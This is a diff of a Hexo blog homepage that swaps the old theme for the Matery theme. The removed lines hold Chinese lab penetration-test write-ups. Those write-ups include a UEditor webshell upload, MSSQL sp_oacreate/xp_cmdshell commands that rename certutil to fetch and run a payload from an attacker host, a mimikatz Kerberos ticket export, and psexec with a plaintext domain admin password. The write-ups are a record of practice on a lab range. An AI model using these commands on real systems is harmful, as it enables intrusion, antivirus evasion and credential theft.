@@ -1,505 +1,991 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE HTML>
+<html lang="en">
+
+
 <head>
-  <meta charset="utf-8">
-  
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
+    <meta charset="utf-8">
+    <meta name="keywords" content="Hexo">
+    <meta name="description" content="Hexo">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
     
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
 
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+    <title>Hexo</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
 
-  
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
 <meta name="generator" content="Hexo 6.1.0"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a target="_blank" rel="noopener" href="https://icesoula.github.io/" class="waves-effect waves-light">
       
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>Contact</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
+
+    <ul class="menu-list mobile-menu-list">
         
-          <a class="main-nav-link" href="/">Home</a>
+        <li class="m-nav-item">
+	  
+		<a target="_blank" rel="noopener" href="https://icesoula.github.io/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
         
-          <a class="main-nav-link" href="/archives">Archives</a>
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
         
-      </nav>
-      <nav id="sub-nav">
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
 </header>
 
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-和室友艰辛的一次打靶记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/04/08/%E5%92%8C%E5%AE%A4%E5%8F%8B%E8%89%B0%E8%BE%9B%E7%9A%84%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" class="article-date">
-  <time class="dt-published" datetime="2022-04-08T03:22:40.262Z" itemprop="datePublished">2022-04-08</time>
-</a>
     
-  </div>
-  <div class="article-inner">
+<style>
+    .carousel-control {
+        width: 45px;
+        height: 45px;
+        line-height: 55px;
+        border-radius: 45px;
+        background: transparent;
+        cursor: pointer;
+        z-index: 100;
+    }
+
+    #prev-cover {
+        position: absolute;
+        top: 48%;
+        left: 8px;
+    }
+
+    #next-cover {
+        position: absolute;
+        top: 48%;
+        right: 8px;;
+    }
+
+    #prev-cover i {
+        margin-right: 3px;
+    }
+
+    #next-cover i {
+        margin-left: 3px;
+    }
+
+    .carousel-control:hover {
+        background-color: rgba(0, 0, 0, .4);
+    }
+
+    .carousel-control i {
+        color: #fff;
+        font-size: 2.4rem;
+    }
+</style>
+
+
+
+<div class="carousel carousel-slider center index-cover" data-indicators="true" style="margin-top: -64px;">
     
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/04/08/%E5%92%8C%E5%AE%A4%E5%8F%8B%E8%89%B0%E8%BE%9B%E7%9A%84%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">和室友艰辛的一次打靶记录</a>
-    </h1>
-  
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="和室友艰辛的一次打靶记录"><a href="#和室友艰辛的一次打靶记录" class="headerlink" title="和室友艰辛的一次打靶记录"></a>和室友艰辛的一次打靶记录</h1><p>之前室友找到了个非常好的靶场，说和我一起打。我们用了四天时间，经历了巨多磨难，总算是让所有机器全部上线（这其中大部分都是我室友打下来的，我有点像个混子一样。。。），由于大部分是舍友打下来的，所以这里我从头到尾复现一下，也顺便把踩过的坑记录一下。</p>
-<h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>所有机子都是搭在舍友的电脑上的vmware上的。他用一个内网穿透把web1的入口映射到了他的服务器上。这里直接访问他给的网站即可。</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220330161905.png" alt="20220330161905"></p>
-<p>是个cms，这个页面上的登陆和注册就是俩摆设，没啥用。所以这边直接dirsearch扫描</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220330143737.png" alt="20220330143737"></p>
-<p>这里看到了一个admin&#x2F;login.aspx。直接访问，会弹出来一个后台管理登陆注册界面，而且admin显示已经让注册过了。手动sql注入一番失败后，我直接自己注册了一个管理员登陆了上去。</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220330161828.png" alt="20220330161828"></p>
-<p>然后就有了现在这个界面。到了这里舍友一眼就看中了百度Ueditor,而我把目光放在了模版上面（嗯。。。最后shell是舍友的方法拿下的。。。）模版这块由于原来的模版只有html、css和js文件，所以无法直接写马。添加模版需要admin账户的权限。所以这里用sqlmap尝试注入，虽然能注，但速度很慢。这时候舍友在网上找到了源码，这种cms的数据库信息一般都是写死在源码中的，所以我们能通过源码拿到数据库表名字段名等一些信息。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105754.png" alt="image-20220330090053912"></p>
-<p>在这个配置文件中找到了数据库文件HdhCms.mdb。用office打开</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105757.png" alt="image-20220330090117660"></p>
-<p>找到了数据库中含有admin用户的表名和对应的字段名。然后sqlmap跑出了结果。有了admin用户，我们就可以增加配置文件了。然而配置文件有白名单过滤。基本所有方法都试了也不行。与此同时舍友用打Ueditor的方法拿下了web1。</p>
-<p>在服务器上上传一个html文件：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+    <div class="carousel-item  white-text bg-cover about-cover">
+        <div class="container">
+            <div class="row">
+    <div class="col s10 offset-s1 m8 offset-m2 l8 offset-l2">
+        <div class="brand">
+            <div class="title center-align">
+                
+                    subtitle
+                
+            </div>
 
-<p>浏览器访问会有这样的界面</p>
-<p>![截屏2022-03-30 下午5.26.10](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-03-30 下午5.26.10.png)</p>
-<p>然后在服务器上上传一张图片马，其实直接把写好的aspx木马后缀改为.jpg就行了（这里只让传图片）。然后把图片路径写入文本框中上传。</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220330151830.png" alt="20220330151830"></p>
-<p>看到这里就代表上传成功了，直接蚁剑连就行了。</p>
-<p>但这里注意一下我们服务器上的文件是ice.jpg,而我们上传的文件名为ice.jpg?.aspx,这里用到了一个解析漏洞，web1来我们服务器上取文件时，并不能解析?及后面的内容，所以它取走的是ice.jpg,但在web的IIS服务器上存放时却解析了后面的aspx。</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220330152505.png" alt="20220330152505"></p>
-<p>接下来要想办法让web1上线msf或CS，这里我们传上去的可执行文件都让杀软给杀了。我弄了很多的免杀也没有逃掉360和火绒的法眼。但我舍友用msf生成了编码后的aspx文件绕过了杀软的检测，后来我试了一下，貌似aspx文件不用编码也不会被杀。</p>
-<p>生成aspx把流量反弹到服务器的1234端口，再使用frp，把服务器上1234端口的流量转发到kali的4444端口。</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220330154903.png" alt="20220330154903"></p>
-<p>这里看到web1上线msf了。</p>
-<h2 id="DATA1"><a href="#DATA1" class="headerlink" title="DATA1"></a>DATA1</h2><p>到了这个时候要按道理是要扫描的。但是在蚁剑中我们找到了它的HdhApp.config。</p>
-<p>![截屏2022-03-30 下午7.31.07](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Desktop&#x2F;截屏2022-03-30 下午7.31.07.png)</p>
-<p>在这里我们可以很清楚的看到数据库账户密码以及数据库服务器的ip。我舍友从网上找了一个能连接数据库的aspx大马。</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220330195325.png" alt="20220330195325"></p>
-<p>我们可以直接成功连接，这里使用tasklist &#x2F;SVC命令，导出的结果可以直接拿去在线杀软识别工具识别杀软。</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220330195342.png" alt="20220330195342"></p>
-<p>结果发现data1这台机子并没有360，只有火绒。于是有了这样一个思路，之前所有传上去的面杀，有360杀掉的，也有火绒杀掉的，那么这次我们只要传上去之前试过的360杀掉的而火绒杀不掉的木马应该就可以了。所以在我的要求下，我们看了web1中杀软被杀的具体情况。 </p>
-<p>嗯。。。大概看了一下，感觉都是360杀的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105832.jpg" alt="E3B51E067B2366D67635BC9838C3B0C2"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105839.jpg" alt="40C990A590B7A5066AF38F27984D7FCC"></p>
-<p>但我细心的舍友发现这里有两种情况，一种是木马上传后立即被杀掉，就和第一张图一样。而在第二张图中，当时我传上去了一个加载器和一个二进制文件，这两个是肯定不会被杀软杀掉的。但是我用加载器把二进制文件加载成可执行文件并注入内存时系统报了错，360这里检测到了这个行为并阻止了。</p>
-<p>那么在没有360的data2中，我们用加载器的方法应该就没问题了。</p>
-<p>这里需要把加载器和CS生成的二进制文件传到data2中。这里我们用certutil从远程服务器上下载。但是失败了，原因大概是火绒对本地certutil有限制。所以这里我们选择把certutil从System32下移位并重命名绕过检测。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;  RECONFIGURE;  exec sp_configure &#x27;Ole Automation Procedures&#x27;, 1;  RECONFIGURE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">利用sp_oacreate构造语句，将certutil.exe复制到c:\windows\temp\下，并重命名为cerice.exe：</span><br><span class="line">declare @o int exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;C:\Windows\System32\certutil.exe&#x27; ,&#x27;c:\windows\temp\cerice.exe&#x27;;</span><br><span class="line"></span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\cerice.exe -urlcache -split -f &quot;http://your_ip:20022/HanzoInjection.exe&quot; C:\Users\MSSQLSERVER\hanzo.exe&#x27;</span><br><span class="line"></span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\cerice.exe -urlcache -split -f &quot;http://your ip/payload.bin&quot; C:\Users\MSSQLSERVER\payload.bin&#x27;</span><br><span class="line"></span><br><span class="line">Exec master.dbo.xp_cmdshell &#x27;cd C:\Users\MSSQLSERVER\ &amp;&amp; hanzo.exe -e payload.bin&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>CS成功上线</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220330212038.png" alt="20220330212038"></p>
-<p>然后我们看一下网卡信息</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220330213444.png" alt="20220330213444"></p>
-<p>紧接着用CS自带的扫描器对22网段做个扫描</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220330213411.png" alt="20220330213411"></p>
-<h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p>那么该网段剩下的就还有192.168.22.149这台机子没有拿到了。在这次扫描中，发现149的80端口是开着的，于是我们挂上CS的代理直接访问。</p>
-<p>![截屏2022-03-30 下午11.56.19](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-03-30 下午11.56.19.png)</p>
-<p>![截屏2022-03-30 下午10.07.03](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Desktop&#x2F;截屏2022-03-30 下午10.07.03.png)</p>
-<p>我们成功得到一个登陆界面，并且在用他给的用户名密码登录后抓到了一个jwt，于是到这里我满怀欣喜的去爆破了。最后也的确爆破出了结果</p>
-<p>![截屏2022-03-28 上午10.00.29](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Desktop&#x2F;截屏2022-03-28 上午10.00.29.png)</p>
-<p>然而就在这个时候，我的舍友发现了些了不起的东西。他通过目录扫描找到了一个名为a.php的文件，我们访问这个文件</p>
-<p>前面是一些sql的日志信息，后面跟了个phpinfo。</p>
-<p>![截屏2022-03-31 上午12.01.59](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-03-31 上午12.01.59.png)</p>
-<p>但最后这个东西就让人有点不淡定了，这貌似就是一个一句话木马没参数报的错。这里我们直接给蚁剑挂代理打。</p>
-<p>![截屏2022-03-30 下午10.24.07](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Desktop&#x2F;截屏2022-03-30 下午10.24.07.png)</p>
-<p>然后居然真成功了。直接上线CS，这里以data1为跳板再起一个监听器</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220330224350.png" alt="20220330224350"></p>
-<p>然后生成一个可执行文件上传到web2中运行</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220330224438.png" alt="20220330224438"></p>
-<h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><p>其实到了这里我们已经打进域内了</p>
-<p>![截屏2022-03-31 上午12.16.21](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-03-31 上午12.16.21.png)</p>
-<p>后面就是我最喜欢的环节了，直接mimi抓密码。嗯。。。抓了个寂寞，明文一个没抓到不说，连个管理员的hash都没有，即没法ipc远程连接，也没法hash传递。一怒之下，我看都没看直接导出了所有票据。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure>
-
-<p><img src="/Users/shihiroshisakai/Downloads/20220330225238.png" alt="20220330225238"></p>
-<p>还真不少，由于这里的票据是TGS返回的票据，里面包含服务ntlm加密的session_key值，所以我们只要找到服务是域控的，抓到的就可能是域管的hash了。这里有不少，我们随便抓一个下来爆破。</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220328233414.png" alt="20220328233414"></p>
-<p>这里爆破出了一个明文密码。就像之前说的一样，由于我选取的票据服务端是域控，所以盲猜这个就是域管的密码。</p>
-<p>那么就用一下psexec试试吧,首先建立一个smb监听![截屏2022-04-08 上午11.06.46](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-04-08 上午11.06.46.png)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\16SEREVR-DC1\ipc$ &quot;P@55w0rd!&quot; /user:&quot;Administrator&quot;   </span><br><span class="line">jump psexec 16SEREVR-DC1 smb   //smb是我们之前建立的监听器的名字</span><br></pre></td></tr></table></figure>
-
-<p>然后就成功了（这里截图丢了，环境也不好重开，见谅。。。）。</p>
-<h2 id="DATA2"><a href="#DATA2" class="headerlink" title="DATA2"></a>DATA2</h2><p>域控都到手了我还怕个DATA2？我一开始是这么想的，但是事实证明我错了，我用打域控的方法打了一下DATA2，虽然ipc连接能够成功建立，但是psexec却不能成功执行。后来耽误了很长时间，我舍友用CS自带的psexec给拿下了，我看了一下，CS自带的psexec和我之前的打法的确不同，我是先建立ipc连接，然后上传psexec并运行，而它是先制作了个管理员的令牌并注入内存后再上传psexec并运行的，说实话到现在我也不知道为啥效果会不一样，等以后研究明白后我会把这段补上的。。。</p>
-<p>纪念一下：</p>
-<p><img src="/Users/shihiroshisakai/Downloads/Cache_d7190aefe1187f6.jpg" alt="Cache_d7190aefe1187f6"></p>
-
-      
+            <div class="description center-align">
+                
+                <span id="subtitle"></span>
+                <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11"></script>
+                <script>
+                    var typed = new Typed("#subtitle", {
+                        strings: [ 
+                            
+                                "从来没有真正的绝境, 只有心灵的迷途",
+                            
+                                "Never really desperate, only the lost of the soul",
+                            
+                        ],
+                        startDelay: 300,
+                        typeSpeed: 100,
+                        loop: true,
+                        backSpeed: 50,
+                        showCursor: true
+                    });
+                </script>
+                
+            </div>
+        </div>
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/08/%E5%92%8C%E5%AE%A4%E5%8F%8B%E8%89%B0%E8%BE%9B%E7%9A%84%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" data-id="cl1pxqdzw0002tou85c3de5ez" data-title="和室友艰辛的一次打靶记录" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
+</div>
+
+
+<script>
+    // 每天切换 banner 图.  Switch banner image every day.
+    var bannerUrl = "/medias/banner/" + new Date().getDay() + '.jpg';
+    $('.bg-cover').css('background-image', 'url(' + bannerUrl + ')');
+</script>
 
 
 
-  
-    <article id="post-记一次靶场练习-VulnStack-4" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-VulnStack-4/" class="article-date">
-  <time class="dt-published" datetime="2022-04-08T03:22:40.256Z" itemprop="datePublished">2022-04-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-VulnStack-4/">记一次靶场练习-VulnStack-4</a>
-    </h1>
-  
+            <div class="cover-btns">
+                <a href="#indexCard" class="waves-effect waves-light btn">
+                    <i class="fa fa-angle-double-down"></i>Start
+                </a>
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="记一次靶场练习-VulnStack-4"><a href="#记一次靶场练习-VulnStack-4" class="headerlink" title="记一次靶场练习-VulnStack-4"></a>记一次靶场练习-VulnStack-4</h1><p>这里先给出拓扑图（图是网上贴的，我这边HOST1的IP是192.168.111.138）</p>
-<p><img src="https://img-blog.csdnimg.cn/2020111111304336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMDA3MDQz,size_16,color_FFFFFF,t_70#pic_center" alt="img"></p>
-<p>配置环境在这里就不记录了，直接从开打写起。</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>由于默认已经知道了HOST1的ip，但直接访问ip显示404，所以这里我们用nmap扫一下。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV 192.168.111.138</span><br></pre></td></tr></table></figure>
+                
+                    <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light btn" target="_blank">
+                        <i class="fab fa-github-alt"></i>Github
+                    </a>
+                
+            </div>
+            <div class="cover-social-link">
+    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
 
-<p>结果如图：</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220405221129.png" alt="20220405221129"></p>
-<p>在这里我们能够看见它的2002端口的tomcat以及2003端口的phpMyAdmin及其相应的版本。</p>
-<h2 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h2><h3 id="phpMyAdmin文件包含漏洞"><a href="#phpMyAdmin文件包含漏洞" class="headerlink" title="phpMyAdmin文件包含漏洞"></a>phpMyAdmin文件包含漏洞</h3><p>看到4.8.1的phpMyAdmin我们自然就能想到它的文件包含漏洞，这里我们测试一下该漏洞是否存在：</p>
